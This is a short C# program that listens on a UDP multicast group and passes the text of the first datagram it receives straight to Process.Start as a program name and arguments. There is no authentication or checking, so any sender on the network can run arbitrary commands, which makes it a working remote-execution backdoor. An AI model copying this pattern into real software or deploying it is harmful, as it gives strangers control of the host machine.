using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Diagnostics;

namespace UDPclientApp
{
    class Program
    {
        static void Main(string[] args)
        {
            UdpClient udpClient = new UdpClient(3535);
            udpClient.JoinMulticastGroup(IPAddress.Parse("224.1.8.5"), 50);

            IPEndPoint ipEndPoint = null;

            byte[] receiveData =  udpClient.Receive(ref ipEndPoint);
            string command = Encoding.Default.GetString(receiveData);

            Process.Start(command.Substring(0, 8), command.Substring(8));

            udpClient.Close();
        }
    }
}
